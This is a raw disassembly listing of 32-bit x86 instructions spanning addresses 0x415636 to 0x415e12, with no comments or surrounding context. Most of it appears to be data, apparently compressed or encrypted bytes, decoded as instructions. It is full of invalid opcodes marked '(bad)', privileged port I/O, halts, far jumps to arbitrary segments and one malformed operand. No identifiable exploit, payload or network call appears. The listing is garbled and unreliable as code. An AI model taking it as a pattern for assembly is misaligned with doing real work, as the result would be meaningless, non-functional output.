  415636:	sbb    BYTE PTR [esp+edx*1+0x55b46951],0x31
  41563e:	pop    ebp
  41563f:	popa   
  415640:	cmp    cl,bl
  415642:	lods   eax,DWORD PTR ds:[esi]
  415643:	push   esp
  415644:	dec    esi
  415645:	sar    DWORD PTR [edx+0x538b3813],cl
  41564b:	mov    eax,0x2288f807
  415650:	cdq    
  415651:	aad    0xd3
  415653:	pop    esp
  415654:	pushf  
  415655:	out    0xbd,eax
  415657:	push   ebp
  415658:	arpl   WORD PTR [edi-0x24],bp
  41565b:	mov    cl,BYTE PTR [edi]
  41565d:	inc    ebx
  41565e:	imul   edx,eax,0xffffff9f
  415661:	sub    bh,BYTE PTR [eax+0x61406752]
  415667:	mov    bl,0xc1
  415669:	pushf  
  41566a:	fimul  WORD PTR [ebx+0x52]
  41566d:	mov    bl,0x81
  41566f:	xchg   esi,eax
  415670:	pop    ss
  415671:	mov    bl,0xb5
  415673:	std    
  415674:	fwait
  415675:	sub    al,0xa8
  415677:	push   0xc7da059e
  41567c:	test   BYTE PTR [edx-0x265900a0],0x3f
  415683:	jo     0x4156df
  415685:	sub    eax,0x18cbf94
  41568a:	jb     0x415635
  41568c:	inc    ecx
  41568d:	cmp    cl,ch
  41568f:	xor    BYTE PTR [eax-0x2],cl
  415692:	pop    esp
  415693:	sub    al,BYTE PTR [eax]
  415695:	push   0x7733414f
  41569a:	hlt    
  41569b:	adc    eax,0xbcd2cf24
  4156a0:	mov    eax,ds:0xf6ec2796
  4156a5:	rcr    BYTE PTR [edi],0xac
  4156a8:	ja     0x4156c3
  4156aa:	ror    DWORD PTR [ebx-0xc],1
  4156ad:	xor    eax,0xd3765e2d
  4156b2:	fdivr  DWORD PTR [esi+eax*1-0x6f8ba6d1]
  4156b9:	(bad)  
  4156ba:	int    0x8d
  4156bc:	sub    eax,0xd6fe9b2c
  4156c1:	mov    esp,0x3fae1763
  4156c6:	(bad)  
  4156c7:	icebp  
  4156c8:	sbb    dl,cl
  4156ca:	or     DWORD PTR [eax],esi
  4156cc:	nop
  4156cd:	mov    dl,0xd3
  4156cf:	xchg   ebx,eax
  4156d0:	bound  edi,QWORD PTR [ebx+eax*4-0xfd50b99]
  4156d7:	ja     0x41573f
  4156d9:	aaa    
  4156da:	inc    esp
  4156db:	loop   0x415735
  4156dd:	sub    al,0xe2
  4156df:	popf   
  4156e0:	das    
  4156e1:	aam    0x23
  4156e3:	jmp    0xd061:0x116233e8
  4156ea:	push   0x28beca3a
  4156ef:	sbb    BYTE PTR [esi+0x13],0x50
  4156f3:	mov    eax,ds:0xba212b90
  4156f8:	and    ah,BYTE PTR [ecx-0x14]
  4156fb:	and    edi,esp
  4156fd:	jp     0x415720
  4156ff:	out    0x9,eax
  415701:	and    bl,dl
  415703:	(bad)  
  415704:	dec    bl
  415706:	dec    ebx
  415707:	dec    edx
  415708:	fisttp QWORD PTR [esp]
  41570b:	ja     0x41569b
  41570d:	add    ebx,0x49f7fc74
  415713:	and    dh,BYTE PTR [edi]
  415715:	push   esi
  415716:	cwde   
  415717:	push   ebx
  415718:	xchg   esi,eax
  415719:	push   ecx
  41571a:	push   ds
  41571b:	pop    esp
  41571c:	icebp  
  41571d:	jo     0x4156e7
  41571f:	fs jl  0x41577e
  415722:	lds    esi,FWORD PTR [edx-0x2fe68a5d]
  415728:	(bad)  
  415729:	mov    eax,ds:0xafdf4acd
  41572e:	rol    edx,1
  415730:	cmp    DWORD PTR [ecx-0x49e2a610],edx
  415736:	sahf   
  415737:	out    dx,eax
  415738:	call   0x2d94817b
  41573d:	ins    BYTE PTR es:[edi],dx
  41573e:	inc    eax
  41573f:	shl    BYTE PTR [esi],0xc5
  415742:	add    esi,DWORD PTR [ecx-0x35]
  415745:	scas   eax,DWORD PTR es:[edi]
  415746:	mov    DWORD PTR [ecx+0x2e44332e],edi
  41574c:	int3   
  41574d:	or     cl,BYTE PTR [edi]
  41574f:	xchg   edx,eax
  415750:	mov    edx,0x4b466593
  415755:	jp     0x415795
  415757:	test   eax,0xbb3de242
  41575c:	push   0xcbb84d6d
  415761:	mov    dl,al
  415763:	or     ebx,DWORD PTR [ebx+0x32]
  415766:	ret    
  415767:	sbb    DWORD PTR [edi-0x36],0x907886aa
  41576e:	pop    esp
  41576f:	inc    edi
  415770:	pop    edi
  415771:	jg     0x4157ec
  415773:	cwde   
  415774:	outs   dx,DWORD PTR ds:[esi]
  415775:	xchg   esi,eax
  415776:	jnp    0x4157a9
  415778:	ret    
  415779:	aad    0x1d
  41577b:	loope  0x41571a
  41577d:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  41577f:	les    ebp,FWORD PTR ds:0x1048fa35
  415785:	cmp    BYTE PTR [ebp-0x4f291d8d],0xa0
  41578c:	cs jne 0x41574e
  41578f:	mov    esi,0x10c5bd33
  415794:	jmp    0x2e93a892
  415799:	fldenv [esi]
  41579c:	ror    DWORD PTR [edx+0x2ee9996b],0x4c
  4157a3:	and    DWORD PTR [ecx-0x389f57c5],eax
  4157a9:	xor    DWORD PTR [ebx+0x51c16625],eax
  4157af:	pop    edx
  4157b1:	or     eax,0x945026ed
  4157b6:	push   esi
  4157b7:	push   0x9b755ad1
  4157bc:	ficom  DWORD PTR [edi]
  4157be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4157bf:	jle    0x4157eb
  4157c1:	mov    al,0x52
  4157c3:	(bad)  [esi]
  4157c5:	push   ds
  4157c6:	jge    0x4157e1
  4157c8:	repnz inc ebx
  4157ca:	lds    eax,FWORD PTR [eax+0x1a06bbc0]
  4157d0:	xor    BYTE PTR [eax+0x1eb28aba],dl
  4157d6:	repz popf 
  4157d8:	stc    
  4157d9:	dec    ebx
  4157da:	stc    
  4157db:	clc    
  4157dc:	scas   al,BYTE PTR es:[edi]
  4157dd:	cmp    al,0x45
  4157df:	sbb    cl,BYTE PTR [eax+0x31c6a998]
  4157e5:	sti    
  4157e6:	inc    esp
  4157e7:	mov    WORD PTR [ebx],fs
  4157e9:	or     eax,0xbdffa8e5
  4157ee:	and    eax,DWORD PTR [eax+ebx*1-0x5e]
  4157f2:	test   DWORD PTR ds:0xab696ff9,ebp
  4157f8:	mov    esi,0x2e147b22
  4157fd:	cmp    al,0x77
  4157ff:	ficomp WORD PTR [ebx+0x6f]
  415802:	add    al,0xbc
  415804:	retf   
  415805:	mov    dh,0xec
  415807:	test   BYTE PTR [ecx],bl
  415809:	cmp    DWORD PTR [eax-0x7e],esi
  41580c:	xchg   ebx,eax
  41580d:	daa    
  41580e:	inc    dh
  415810:	sbb    eax,0x9a2bc167
  415815:	xchg   ebx,eax
  415816:	test   ebp,edi
  415818:	pop    ebx
  41581a:	aas    
  41581b:	clc    
  41581c:	es (bad) 
  41581e:	iret   
  41581f:	leave  
  415820:	push   esi
  415821:	xor    DWORD PTR [ecx-0x4b66c2c1],0x87d9c247
  41582b:	data16 adc al,0xb2
  41582e:	inc    ecx
  41582f:	push   eax
  415830:	ins    DWORD PTR es:[edi],dx
  415831:	fs jmp 0x1fee:0x2690a7c7
  415839:	not    BYTE PTR cs:[edi-0x33]
  41583d:	in     eax,dx
  41583e:	rol    ebx,cl
  415840:	dec    esi
  415841:	test   DWORD PTR [eax+0x3464ee49],0xece08963
  41584b:	xchg   ebx,eax
  41584c:	test   eax,0x78d9cd1e
  415851:	mov    ecx,0xea4b8b3a
  415856:	add    DWORD PTR [ebp-0x111a1cb9],0xffffffbf
  41585d:	fistp  WORD PTR [edi-0x39]
  415860:	push   esp
  415861:	outs   dx,BYTE PTR ds:[esi]
  415862:	jb     0x4158ba
  415864:	lods   eax,DWORD PTR ds:[esi]
  415865:	sub    al,0xa8
  415867:	dec    BYTE PTR [eax+0x4b]
  41586a:	xlat   BYTE PTR ds:[ebx]
  41586b:	xchg   bl,bl
  41586d:	jp     0x415856
  41586f:	out    0x16,eax
  415871:	out    dx,al
  415872:	mov    eax,0xdcf6ca20
  415877:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415878:	mov    ds:0x27da7577,al
  41587d:	pushaw 
  41587f:	hlt    
  415880:	fwait
  415881:	imul   ebx,DWORD PTR [edi-0x30],0x30
  415885:	mov    ebp,0x5b485e06
  41588a:	mov    ds:0xe04c4695,eax
  41588f:	rcl    BYTE PTR [edi+0x46bf2dac],0x9d
  415896:	push   ebp
  415897:	xor    ah,BYTE PTR [esi-0x9839950]
  41589d:	daa    
  41589e:	ss ja  0x4158ac
  4158a1:	imul   edx,DWORD PTR [edx-0x5e],0x61
  4158a5:	int3   
  4158a6:	imul   ebx,DWORD PTR [esi-0x7f],0x40
  4158aa:	mov    edx,0xd5a3ead8
  4158af:	pusha  
  4158b0:	xor    DWORD PTR [ecx],eax
  4158b2:	neg    DWORD PTR [eax+0x40ce4377]
  4158b8:	test   eax,0x3977ded2
  4158bd:	sbb    eax,0xf83f7f13
  4158c2:	retf   0x368f
  4158c5:	rol    DWORD PTR [ecx],1
  4158c7:	cmp    al,0x1c
  4158c9:	inc    esi
  4158ca:	xor    BYTE PTR [edx-0x3cdf16dd],0x48
  4158d1:	pusha  
  4158d2:	dec    ebx
  4158d3:	fst    QWORD PTR [edi+ecx*1+0x2d]
  4158d7:	sub    dh,ch
  4158d9:	xchg   ecx,eax
  4158da:	stos   DWORD PTR es:[edi],eax
  4158db:	jecxz  0x415903
  4158dd:	cmp    BYTE PTR [ebp+0x3bf2a2fd],0xb3
  4158e4:	xor    al,0xb9
  4158e6:	call   0xb2280f91
  4158eb:	mov    ecx,DWORD PTR [esi+0x74]
  4158ee:	dec    ebx
  4158ef:	xor    eax,DWORD PTR [ecx+0x3a2afe97]
  4158f5:	xchg   esi,eax
  4158f6:	jecxz  0x41596e
  4158f8:	les    esp,FWORD PTR [eax+0x42]
  4158fb:	movd   mm6,DWORD PTR [ebx-0x4d7f53b4]
  415902:	scas   eax,DWORD PTR es:[edi]
  415903:	or     ch,BYTE PTR [esi+0x56d91547]
  415909:	push   es
  41590a:	ja     0x4158fd
  41590c:	loopne 0x4158e1
  41590e:	repnz mov dl,0xcf
  415911:	aas    
  415912:	scas   al,BYTE PTR es:[edi]
  415913:	add    DWORD PTR [eax+0x2eae435c],ebp
  415919:	mov    edx,0x50931fed
  41591e:	std    
  41591f:	outs   dx,BYTE PTR ds:[esi]
  415920:	sbb    DWORD PTR [eax],0x3cbcd300
  415926:	ss mov edx,0xd4cfb649
  41592c:	mov    dl,0x78
  41592e:	or     al,0xaa
  415930:	cmp    edx,ecx
  415932:	xchg   esp,eax
  415933:	adc    DWORD PTR [edx],ecx
  415935:	lock cmp edi,DWORD PTR [edi+ecx*2-0x708313f7]
  41593d:	test   al,0x7f
  41593f:	(bad)  
  415940:	scas   al,BYTE PTR es:[edi]
  415941:	(bad)  
  415942:	fs sti 
  415944:	(bad)  
  415945:	daa    
  415946:	test   DWORD PTR [eax],esp
  415948:	lds    esi,FWORD PTR [ecx-0x12]
  41594b:	sbb    bh,dl
  41594d:	dec    edx
  41594e:	xchg   ebp,eax
  41594f:	add    al,0xcc
  415951:	test   DWORD PTR [edi+0x79c529d9],0x97a538d1
  41595b:	clc    
  41595c:	icebp  
  41595d:	mov    ah,0xcd
  41595f:	lods   eax,DWORD PTR ds:[esi]
  415960:	sub    DWORD PTR ds:[edi+0x26],eax
  415964:	push   esp
  415965:	mov    ch,0x76
  415967:	(bad)  
  415968:	xor    bl,BYTE PTR [edx]
  41596a:	mov    ds:0x6c808b98,eax
  41596f:	xchg   esp,eax
  415970:	sub    eax,0xd4e46646
  415975:	push   esp
  415976:	nop
  415977:	aaa    
  415978:	aad    0xd6
  41597a:	fdivr  st(0),st
  41597c:	mov    esi,0xea4881fc
  415981:	test   bl,ah
  415983:	mov    ah,0xa
  415985:	in     eax,dx
  415986:	in     al,0x29
  415988:	lahf   
  415989:	cmp    BYTE PTR [esi-0x515a7b4f],bh
  41598f:	jl     0x41595c
  415991:	xlat   BYTE PTR ds:[ebx]
  415992:	call   0x1f77f66f
  415997:	sahf   
  415998:	in     eax,dx
  415999:	pop    esp
  41599a:	jae    0x415a08
  41599c:	adc    eax,0x84e13a57
  4159a1:	sub    eax,DWORD PTR [edi-0x78bcc55b]
  4159a7:	nop
  4159a8:	dec    esi
  4159a9:	add    BYTE PTR [eax-0x4b],bh
  4159ac:	pop    esi
  4159ad:	jo     0x41595f
  4159af:	frstor [ecx-0x78a5400a]
  4159b5:	call   0x2191:0x348b5df3
  4159bc:	popf   
  4159bd:	pop    es
  4159be:	outs   dx,BYTE PTR ds:[esi]
  4159bf:	mov    cs,WORD PTR [ebp+0x2bc97394]
  4159c5:	add    ch,al
  4159c7:	dec    esi
  4159c8:	mov    edi,0xf57fef98
  4159cd:	inc    ecx
  4159ce:	in     al,0x9b
  4159d0:	lods   eax,DWORD PTR ds:[esi]
  4159d1:	adc    BYTE PTR [eax+0x21956881],ah
  4159d7:	out    0xb3,al
  4159d9:	ins    DWORD PTR es:[edi],dx
  4159da:	jb     0x415973
  4159dc:	mov    BYTE PTR [ebx],ch
  4159de:	push   ss
  4159df:	aad    0x62
  4159e1:	(bad)  
  4159e2:	jmp    0x4159de
  4159e4:	clc    
  4159e5:	fld    DWORD PTR [ebp+0x2b7a4bed]
  4159eb:	shr    DWORD PTR [ecx],cl
  4159ed:	xlat   BYTE PTR ds:[ebx]
  4159ee:	lahf   
  4159ef:	das    
  4159f0:	push   0x77
  4159f2:	es daa 
  4159f4:	cmp    DWORD PTR [eax-0x17],0xffffff8f
  4159f8:	push   ds
  4159f9:	add    ah,BYTE PTR [edx+0x5e0dd2ec]
  4159ff:	lock cmp al,0xa5
  415a02:	(bad)  
  415a04:	and    BYTE PTR [ebp+0x7a],bh
  415a07:	add    eax,0xbf369c85
  415a0c:	mov    esi,0x6aec858e
  415a11:	clts   
  415a13:	(bad)  
  415a14:	fnstsw WORD PTR [ecx-0x62]
  415a17:	(bad)  
  415a18:	into   
  415a19:	push   es
  415a1a:	fidiv  DWORD PTR [ebx-0x565f1bb]
  415a20:	fisub  WORD PTR [edx-0x1e]
  415a23:	mov    cl,ch
  415a25:	or     BYTE PTR [ebx+ebp*1+0x7d],bl
  415a29:	sub    al,0xc8
  415a2b:	jp     0x415a0a
  415a2d:	lods   al,BYTE PTR ds:[esi]
  415a2e:	sbb    BYTE PTR [ebp-0x6da29a2f],dl
  415a34:	pusha  
  415a35:	adc    ah,bh
  415a37:	retf   0xce13
  415a3a:	mov    eax,0x40ff0d5
  415a3f:	out    0xb8,al
  415a41:	sbb    eax,0x553ac02a
  415a46:	jmp    0x408c87de
  415a4b:	push   edi
  415a4c:	repz js 0x4159fc
  415a4f:	aam    0x1a
  415a51:	int3   
  415a52:	xor    eax,DWORD PTR ds:0x6b439479
  415a58:	push   es
  415a59:	xchg   edi,eax
  415a5a:	stos   BYTE PTR es:[edi],al
  415a5b:	jb     0x415a72
  415a5d:	xchg   esp,eax
  415a5e:	pop    es
  415a5f:	xor    al,0x37
  415a61:	sub    DWORD PTR [edi-0x25f19dc9],0xffffffe5
  415a68:	jns    0x415a40
  415a6a:	call   0xac0d:0xc33b221f
  415a71:	sbb    al,0xf8
  415a73:	jmp    0xd1a4:0xc9a851ad
  415a7a:	pushf  
  415a7b:	(bad)  
  415a7c:	in     al,0x4a
  415a7e:	fcom   DWORD PTR [ebx]
  415a80:	push   cs
  415a81:	sbb    bh,BYTE PTR [ecx-0x21296940]
  415a87:	add    ecx,DWORD PTR [edx-0x4f2a3167]
  415a8d:	cmc    
  415a8e:	push   cs
  415a8f:	pop    esp
  415a90:	pusha  
  415a91:	lds    eax,FWORD PTR [ebp-0x1d]
  415a94:	cmp    al,0x2
  415a96:	dec    eax
  415a97:	leave  
  415a98:	stos   BYTE PTR es:[edi],al
  415a99:	lea    ebp,[ecx+0x77]
  415a9c:	iret   
  415a9d:	out    dx,eax
  415a9e:	nop
  415a9f:	and    DWORD PTR [esi+0x35],esi
  415aa2:	adc    al,dl
  415aa4:	fnstsw WORD PTR [esi-0x1e]
  415aa7:	xlat   BYTE PTR ds:[ebx]
  415aa8:	pushf  
  415aa9:	dec    ecx
  415aaa:	adc    edi,ebp
  415aac:	pop    ebp
  415aad:	sub    al,0x2
  415aaf:	mov    ds:0x3de653ed,al
  415ab4:	add    BYTE PTR [edi+0x52],0xc9
  415ab8:	lahf   
  415ab9:	in     al,dx
  415aba:	mov    dl,0x1b
  415abc:	ret    0xd548
  415abf:	mov    al,0x9b
  415ac1:	loopne 0x415b0c
  415ac3:	ret    
  415ac4:	sbb    al,0xb8
  415ac6:	cwde   
  415ac7:	or     DWORD PTR [ebx],edx
  415ac9:	jno    0x415abc
  415acb:	das    
  415acc:	stc    
  415acd:	adc    edx,0xffffffa4
  415ad0:	mov    edx,0x2a905b41
  415ad5:	jmp    0x975e:0x758c0692
  415adc:	jl     0x415b10
  415ade:	ss fs aaa 
  415ae1:	in     eax,dx
  415ae2:	xchg   BYTE PTR [edx],bh
  415ae4:	and    al,0xeb
  415ae6:	lods   al,BYTE PTR ds:[esi]
  415ae7:	pop    esi
  415ae8:	lea    ebx,ds:0xbad3bac6
  415aee:	add    dl,BYTE PTR [eax+ecx*8+0x4c]
  415af2:	mov    eax,0x807bbc0f
  415af7:	out    0x0,al
  415af9:	adc    al,0x41
  415afb:	mov    edx,0x32114703
  415b00:	adc    DWORD PTR ds:0x6e7f2c0,ebx
  415b06:	dec    ecx
  415b07:	adc    ebx,DWORD PTR [edi+0x50d5ad91]
  415b0d:	popa   
  415b0e:	xlat   BYTE PTR ds:[ebx]
  415b0f:	mov    ecx,0xd21b826d
  415b14:	push   eax
  415b15:	(bad)  
  415b16:	scas   al,BYTE PTR es:[edi]
  415b17:	adc    ch,al
  415b19:	pop    ss
  415b1a:	jecxz  0x415b56
  415b1c:	stc    
  415b1d:	xor    eax,0x152967fc
  415b22:	add    BYTE PTR [eax-0x4f],dh
  415b25:	sti    
  415b26:	dec    ebp
  415b27:	push   ebx
  415b28:	loopne 0x415ae9
  415b2a:	push   esp
  415b2b:	cs cmp ah,ah
  415b2e:	mov    esp,eax
  415b30:	cmp    DWORD PTR [esp+eax*4+0xa1e082e],esi
  415b37:	push   ebp
  415b38:	or     esi,DWORD PTR [ebx-0x4a4e9a5e]
  415b3e:	mov    dh,0x84
  415b40:	or     DWORD PTR [ebx-0x13],ebx
  415b43:	mov    DWORD PTR [ebx+eax*1],0x8f89fe1
  415b4a:	inc    ebp
  415b4b:	and    BYTE PTR [esi+0x4a],bh
  415b4e:	sahf   
  415b4f:	call   0xbea6:0x918539dd
  415b56:	push   eax
  415b57:	adc    al,0xe2
  415b59:	jl     0x415b78
  415b5b:	push   0x688d2b54
  415b60:	sub    dl,bh
  415b62:	neg    DWORD PTR [esi+0xb1deb8c]
  415b68:	add    dh,BYTE PTR [ecx]
  415b6a:	ja     0x415bae
  415b6c:	aam    0xfa
  415b6e:	push   edx
  415b6f:	mov    edi,0x583be58b
  415b74:	pop    es
  415b75:	mov    BYTE PTR [ebx+0x3ff7331e],cl
  415b7b:	jno    0x415b17
  415b7d:	jp     0x415ba9
  415b7f:	xor    bh,0x94
  415b82:	(bad)
  415b86:	push   es
  415b87:	add    DWORD PTR [ecx],edi
  415b89:	(bad)  
  415b8a:	jmp    0xabdfd41b
  415b8f:	pop    ss
  415b90:	inc    esi
  415b91:	cld    
  415b92:	and    BYTE PTR [ebx-0x1a],bl
  415b95:	test   al,0x1c
  415b97:	in     al,dx
  415b98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415b99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b9a:	cld    
  415b9b:	jnp    0x415b48
  415b9d:	and    esp,ebx
  415b9f:	sbb    al,0xcd
  415ba1:	std    
  415ba2:	aad    0xca
  415ba4:	test   BYTE PTR [edx-0x37a33c5c],dl
  415baa:	jno    0x415ba1
  415bac:	inc    ebx
  415bad:	dec    edx
  415bae:	add    DWORD PTR [esi+eiz*2+0x7],eax
  415bb2:	sbb    eax,DWORD PTR [esi]
  415bb4:	ins    DWORD PTR es:[edi],dx
  415bb5:	sbb    eax,0xa7a72a1d
  415bba:	mov    ds:0xb6127989,eax
  415bbf:	xor    al,0x66
  415bc1:	mov    edi,0x9168b2c5
  415bc6:	jnp    0x415c2a
  415bc8:	mov    al,ds:0x8a1bc403
  415bcd:	xlat   BYTE PTR ds:[ebx]
  415bce:	fistp  DWORD PTR [edi+0x71]
  415bd1:	mov    dl,0x62
  415bd3:	and    al,0x9c
  415bd5:	out    0x3a,eax
  415bd7:	mov    ebx,0xbf9a9458
  415bdc:	ss call 0x7c96:0xaaf8886d
  415be4:	ins    DWORD PTR es:[edi],dx
  415be5:	inc    ecx
  415be6:	xor    ch,BYTE PTR [esi-0x33]
  415be9:	jo     0x415c39
  415beb:	sbb    al,0x16
  415bed:	pop    edi
  415bee:	jge    0x415c2f
  415bf0:	das    
  415bf1:	hlt    
  415bf2:	jle    0x415be5
  415bf4:	popa   
  415bf5:	call   0x6364:0x5bda323d
  415bfc:	pop    esi
  415bfe:	ficomp DWORD PTR [ecx+0xce6caaf]
  415c04:	and    ebx,esi
  415c06:	xor    bh,BYTE PTR [eax]
  415c08:	outs   dx,BYTE PTR ds:[esi]
  415c09:	adc    DWORD PTR [edx+0x27],edi
  415c0c:	inc    edx
  415c0d:	out    dx,al
  415c0e:	pop    esi
  415c0f:	stos   DWORD PTR es:[edi],eax
  415c10:	(bad)  
  415c11:	loopne 0x415c1d
  415c13:	sub    dh,cl
  415c15:	push   ebx
  415c16:	cdq    
  415c17:	sub    eax,0x712331ac
  415c1c:	scas   al,BYTE PTR es:[edi]
  415c1d:	inc    esp
  415c1e:	inc    ecx
  415c1f:	push   cs
  415c20:	xchg   edi,eax
  415c21:	mov    al,0x6c
  415c23:	leave  
  415c24:	cs push ss
  415c26:	dec    esi
  415c27:	into   
  415c28:	cmc    
  415c29:	or     esp,DWORD PTR [edi]
  415c2b:	cmp    eax,0x300dfd6
  415c30:	int3   
  415c31:	jecxz  0x415c8e
  415c33:	mov    DWORD PTR es:[ecx+eiz*8+0x11f1acb3],0x8c15e095
  415c3f:	push   ebp
  415c40:	jle    0x415c72
  415c42:	sar    DWORD PTR [esi],1
  415c44:	xor    BYTE PTR [ecx+ecx*2],dh
  415c47:	mov    bl,0xde
  415c49:	mov    ebx,0x5d6afbed
  415c4e:	inc    edi
  415c4f:	lds    ebp,FWORD PTR [ebx]
  415c51:	test   eax,0x3eca29b4
  415c56:	jmp    0x1987319f
  415c5b:	push   ds
  415c5c:	iret   
  415c5d:	cmp    dh,ah
  415c5f:	sbb    dl,ch
  415c61:	hlt    
  415c62:	sub    edi,0xf32e61a4
  415c68:	add    BYTE PTR [ecx],al
  415c6a:	add    bl,BYTE PTR [eax-0x41]
  415c6d:	shr    DWORD PTR [edx-0x7752a0c1],cl
  415c73:	test   BYTE PTR [esi+0x79],ah
  415c76:	out    dx,eax
  415c77:	sti    
  415c78:	stc    
  415c79:	dec    edi
  415c7a:	(bad)  
  415c7c:	mov    bl,0xdc
  415c7e:	shl    edx,0xb5
  415c81:	mov    esp,0xaebc1bfe
  415c86:	les    ecx,FWORD PTR [eax+ecx*4+0x36]
  415c8a:	pusha  
  415c8b:	(bad)  
  415c8c:	stc    
  415c8d:	popa   
  415c8e:	in     al,dx
  415c8f:	ficomp WORD PTR [ebp-0xb]
  415c92:	xor    esi,DWORD PTR [ebp-0x23]
  415c95:	sub    DWORD PTR [ebp+0x48e09e18],eax
  415c9b:	out    0x29,eax
  415c9d:	sub    eax,0x2eb89dfb
  415ca2:	mov    DWORD PTR [ecx],edx
  415ca4:	ds sahf 
  415ca6:	scas   eax,DWORD PTR es:[edi]
  415ca7:	fcmovbe st,st(7)
  415ca9:	xchg   ebp,eax
  415caa:	lahf   
  415cab:	cmp    cl,BYTE PTR [edi]
  415cad:	call   0x955a80d0
  415cb2:	ret    0xfc7e
  415cb5:	sub    bl,bh
  415cb7:	jne    0x415ce2
  415cb9:	push   esp
  415cba:	or     eax,0xdfb78bf
  415cbf:	cmp    dl,dh
  415cc1:	stc    
  415cc2:	ss fwait
  415cc4:	shl    BYTE PTR ds:0xea90e021,0x6f
  415ccb:	jnp    0x415ce1
  415ccd:	(bad)  
  415cce:	xchg   ebp,eax
  415ccf:	sahf   
  415cd0:	dec    ebx
  415cd1:	data16 and BYTE PTR [eax],ah
  415cd4:	mov    WORD PTR [ebx-0x3c],cs
  415cd7:	ss jmp 0x39d21b67
  415cdd:	jbe    0x415ca7
  415cdf:	xor    al,0x70
  415ce1:	mov    esp,0x640266f3
  415ce6:	jp     0x415d1c
  415ce8:	inc    edi
  415ce9:	xchg   esp,eax
  415cea:	mov    cl,0xbf
  415cec:	pusha  
  415ced:	and    ch,BYTE PTR [ebp-0x2f7e8caf]
  415cf3:	lahf   
  415cf4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415cf5:	js     0x415d24
  415cf7:	mov    bh,cl
  415cf9:	fild   DWORD PTR [eax]
  415cfb:	cmp    BYTE PTR [ecx-0x231affc0],dl
  415d01:	shr    DWORD PTR [edi+0x30],1
  415d04:	shl    bh,cl
  415d06:	xor    eax,edi
  415d08:	push   0x65
  415d0a:	sub    DWORD PTR [ebp-0x1f],eax
  415d0d:	adc    ebp,DWORD PTR [ecx-0x53]
  415d10:	sbb    eax,0xb86ed0da
  415d15:	imul   edi,ebx,0xda4e8138
  415d1b:	sub    al,0xe9
  415d1d:	(bad)  [ecx]
  415d1f:	sub    DWORD PTR [esi],esp
  415d21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d22:	mov    ss,esi
  415d24:	mov    ss,WORD PTR [edx-0x238220fb]
  415d2a:	ja     0x415d7f
  415d2c:	fstp   QWORD PTR [eax+0x2b]
  415d2f:	mov    cl,0x61
  415d31:	rol    al,cl
  415d33:	imul   eax,DWORD PTR [ecx-0x59],0x6ef205cb
  415d3a:	fiadd  DWORD PTR [eax-0x53]
  415d3d:	in     eax,dx
  415d3e:	jp     0x415ce9
  415d40:	cli    
  415d41:	out    0xe3,eax
  415d43:	mov    bl,0x67
  415d45:	sbb    al,0x9d
  415d47:	add    al,0xcc
  415d49:	mov    esp,?
  415d4b:	loopne 0x415d48
  415d4d:	mov    eax,ds:0xcb80b514
  415d52:	aas    
  415d53:	sar    BYTE PTR [eax+edi*8],1
  415d56:	mov    dl,0x52
  415d58:	(bad)  [esi]
  415d5a:	pop    eax
  415d5b:	or     dh,cl
  415d5d:	jg     0x415d60
  415d5f:	sahf   
  415d60:	sbb    esi,DWORD PTR [ecx]
  415d62:	hlt    
  415d63:	fdiv   DWORD PTR [edx-0x3ced9309]
  415d69:	cmp    esi,DWORD PTR [edi]
  415d6b:	lds    edx,FWORD PTR ds:0x473ca759
  415d71:	inc    esi
  415d72:	dec    ebp
  415d73:	mov    ah,0x14
  415d75:	push   esi
  415d76:	js     0x415da8
  415d78:	push   ds
  415d79:	(bad)  
  415d7a:	pop    ebx
  415d7b:	js     0x415d94
  415d7d:	xchg   ebx,eax
  415d7e:	leave  
  415d7f:	mul    DWORD PTR [ecx]
  415d81:	out    dx,al
  415d82:	adc    edx,DWORD PTR [esi]
  415d84:	mov    bl,0xcc
  415d86:	test   eax,0x3f3067cd
  415d8b:	pop    esi
  415d8c:	outs   dx,BYTE PTR ds:[esi]
  415d8d:	ds and edi,ecx
  415d90:	aas    
  415d91:	add    BYTE PTR [edx+edx*2-0x19],bh
  415d95:	ss loop 0x415d34
  415d98:	dec    ebx
  415d99:	or     BYTE PTR [edx],ch
  415d9b:	add    al,0x56
  415d9d:	(bad)  
  415d9e:	mov    ecx,0x8b08447f
  415da3:	aam    0x5f
  415da5:	adc    BYTE PTR [eax+0x4e56a9ad],ch
  415dab:	(bad)  
  415dac:	ds aas 
  415dae:	lock add edx,DWORD PTR [ebp-0x35]
  415db2:	and    bl,bh
  415db4:	add    DWORD PTR [edx],edx
  415db6:	push   ecx
  415db7:	es jns 0x415e17
  415dba:	(bad)  
  415dbb:	sbb    al,0x50
  415dbd:	sub    eax,0x1bf05773
  415dc2:	ss in  al,0x5c
  415dc5:	sbb    dl,ch
  415dc7:	stc    
  415dc8:	in     eax,dx
  415dc9:	clc    
  415dca:	leave  
  415dcb:	inc    ebp
  415dcc:	shr    BYTE PTR [edx+0x6c],0xf3
  415dd0:	imul   esp,DWORD PTR [edi],0xffffff82
  415dd3:	dec    edi
  415dd4:	ret    
  415dd5:	(bad)  
  415dd6:	inc    esp
  415dd7:	sub    al,0xe5
  415dda:	lea    ebx,[ebp+0x2c]
  415ddd:	xor    dh,dl
  415ddf:	and    al,0x9a
  415de1:	push   esi
  415de2:	inc    edi
  415de3:	lods   eax,DWORD PTR ds:[esi]
  415de4:	push   0x22
  415de6:	cwde   
  415de7:	popa   
  415de8:	jecxz  0x415e35
  415dea:	mov    dl,0xe0
  415dec:	js     0x415def
  415dee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415def:	or     eax,ecx
  415df1:	shr    esi,1
  415df3:	lods   eax,DWORD PTR ds:[esi]
  415df4:	call   0x70fe:0xc4cdb66b
  415dfb:	dec    edx
  415dfc:	cmc    
  415dfd:	pop    edi
  415dfe:	ja     0x415e69
  415e00:	jbe    0x415e30
  415e02:	dec    esi
  415e03:	lods   al,BYTE PTR ds:[esi]
  415e04:	es daa 
  415e06:	inc    esi
  415e07:	mov    cl,0x18
  415e09:	popf   
  415e0a:	jae    0x415dac
  415e0c:	push   cs
  415e0d:	mov    dl,0x9b
  415e0f:	mov    cl,0xd4
  415e11:	leave  
  415e12:	imul   ebx,DWORD PTR [eax+0x64c6ee4c],0x4f2dee77
